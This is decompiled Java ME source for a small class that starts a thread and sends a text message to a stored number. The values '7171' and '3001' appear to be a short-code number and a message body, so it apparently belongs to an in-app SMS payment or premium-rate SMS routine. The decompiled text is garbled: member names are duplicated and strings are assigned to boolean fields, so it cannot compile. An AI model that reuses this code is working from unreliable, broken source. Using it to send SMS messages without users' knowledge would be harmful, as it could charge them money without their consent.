/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  javax.microedition.io.Connector
 *  javax.wireless.messaging.Message
 *  javax.wireless.messaging.MessageConnection
 *  javax.wireless.messaging.TextMessage
 */
import java.io.IOException;
import javax.microedition.io.Connector;
import javax.wireless.messaging.Message;
import javax.wireless.messaging.MessageConnection;
import javax.wireless.messaging.TextMessage;

/*
 * Duplicate member names - consider using --renamedupmembers true
 */
public final class b
implements Runnable {
    public Thread a;
    private MessageConnection a;
    private String c;
    public String a;
    public String b;
    public boolean a = "7171";
    public boolean b = "3001";

    final boolean a() {
        if (this.a == null) {
            this.a = true;
            this.b = true;
            this.a = new Thread(this);
            this.a.start();
            return true;
        }
        return false;
    }

    public final void run() {
        try {
            this.c = "sms://" + this.a.toString();
            if (this.a == null) {
                try {
                    this.a = (MessageConnection)Connector.open((String)this.c);
                }
                catch (IOException iOException) {
                    this.b = false;
                }
            }
            try {
                TextMessage textMessage = (TextMessage)this.a.newMessage("text");
                textMessage.setPayloadText(this.b);
                this.a.send((Message)textMessage);
            }
            catch (Exception exception) {
                this.b = false;
            }
            try {
                this.a.close();
            }
            catch (Exception exception) {}
            this.a = null;
        }
        catch (Exception exception) {
            this.b = false;
        }
        this.a = false;
        this.a = null;
    }
}

